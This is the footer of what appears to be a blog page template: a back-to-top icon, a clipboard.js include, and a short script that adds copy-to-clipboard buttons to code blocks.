  <div class="back-to-top-fixed soft-size--round soft-style--box">
    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
    </svg>
  </div>

  
  <!-- aplayer -->


<!-- dplayer -->


<!-- copy button  -->
<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>

<!-- https://clipboardjs.com/ -->


<script type="text/javascript">
	(function () {
		function getCodeType (elem) {
			const classs = Array.from(elem.classList.values());
			if (classs && classs.length > 1) {
				return classs[1];
			}
			return "plain";
		}

		window.addEventListener("DOMContentLoaded", () => {
			const copyBtnClass = "copy-btn";
			//  instantiate clipboardjs 
			const clipboard = new ClipboardJS('.' + copyBtnClass);

			clipboard.on('success', function (e) {
				console.info('Action:', e.action);
				console.info('Text:', e.text);
				console.info('Trigger:', e.trigger);
				if (e.trigger) {
					e.trigger.classList.add("copied");
					setTimeout(() => {
						e.trigger.classList.remove("copied");
					}, 3000);
				}
				e.clearSelection();
			});

			clipboard.on('error', function (e) {
				console.error('Action:', e.action);
				console.error('Trigger:', e.trigger);
			});

			document.querySelectorAll('figure.highlight').forEach((elem) => {
				const codeContent = elem.querySelector("td.code");
				const copyButton = document.createElement('button');
				copyButton.setAttribute("class", copyBtnClass);
				copyButton.setAttribute("title", "Copy Code");
				copyButton.setAttribute("data-clipboard-text", codeContent.innerText);
				elem.insertBefore(copyButton, elem.children[0]);
			});
		})
	})();
</script>








  


  


  







  
  <!-- 尾部用户自定义相关内容 -->


<script src="/bundle.js"></script></body></html>